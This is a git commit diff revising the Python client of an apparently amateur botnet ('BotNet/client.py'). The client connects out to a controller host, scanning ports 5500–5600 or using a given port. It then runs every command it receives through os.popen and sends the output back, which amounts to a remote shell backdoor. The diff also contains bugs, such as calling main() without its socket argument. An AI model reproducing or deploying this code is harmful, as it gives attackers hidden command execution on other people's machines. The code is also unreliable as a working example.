3a2eeeef4f940f5a2281522a6e602ced9ce1f536
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2022-06-16 10:39:14 +0200

    Update client.py

--- BotNet/client.py
+++ BotNet/client.py
@@ -1,71 +1,65 @@
-import socket, os, sys, signal
+import socket, os, sys
 
-try:
-    def main(client):
-        while True:
-            try:            
-                it = client.recv(4096)
-                it = it.decode('utf-8')
-                commandum = it
-                if 'DISCONNECT' in it:
-                    break
-                try:
-                    result = os.popen(commandum).read()
-                    result = result.encode()
-                except:
-                    result = "FATAL EWWOW"
-                client.send(result)
+def main(client):
+    while True:
+        try:            
+            it = client.recv(4096)
+            it = it.decode('utf-8')
+            commandum = it
+            if 'DISCONNECT' in it:
+                break
+            try:
+                result = os.popen(commandum).read()
+                result = result.encode()
             except:
-                break
-
-    def GetOptions():
-        try:
-            host = sys.argv[1]
+                result = "FATAL EWWOW"
+            client.send(result)
         except:
-            host = input ("\nhost : ")
-            if len(host) == 0:
-                host = '127.0.0.1'
-        try:
-            int(sys.argv[2])
-            port = sys.argv[2]
-            PingPort(host, port)   
-        except:
-            try:
-                if sys.argv[2] == '-r' or '-range' or 'range' or '--range':
-                    PingPortRange(host) 
-            except IndexError:
-                pass
-            port = (input ("\nport : "))
-            if len(port) == 0:
-                PingPortRange(host)
-            else:
-                PingPort(host, port)     
+            break
 
-    def PingPortRange(host):
-        for p in range(5500,5600):
-            try:
-                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                client.settimeout(0.0000001)
-                client.connect ((host, (p)))
-                client.settimeout(None)
-                main(client)
-                break
-            except BaseException:
-                pass
-        exit(-1)
-                
-
-    def PingPort(host, port):
+def GetOptions():
+    try:
+        host = sys.argv[1]
+    except:
+        sys.exit()
+    try:
+        int(sys.argv[2])
+        port = sys.argv[2]
+        PingPort(host, port)   
+    except:
+        if '-r' in sys.argv[2]:
+            PingPortRange(host) 
+        if sys.argv[2] == '-p':
+            port = sys.argv[3]
+            PingPort(host, port)
+        else:
+            sys.exit()
+            
+def PingPortRange(host):
+    for p in range(5500,5600):
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.settimeout(0.1)
-            client.connect ((host, int(port)))
+            client.settimeout(0.0000001)
+            client.connect ((host, (p)))
             client.settimeout(None)
-            main()
+            main(client)
+            break
         except BaseException:
             pass
-    GetOptions()
-except BaseException:
-    exit(-1)
+    sys.exit()
+
+            
+
+def PingPort(host, port):
+    try:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.settimeout(0.1)
+        client.connect ((host, int(port)))
+        client.settimeout(None)
+        main()
+    except BaseException:
+        sys.exit()
+
+GetOptions()
 
 #version 1.3
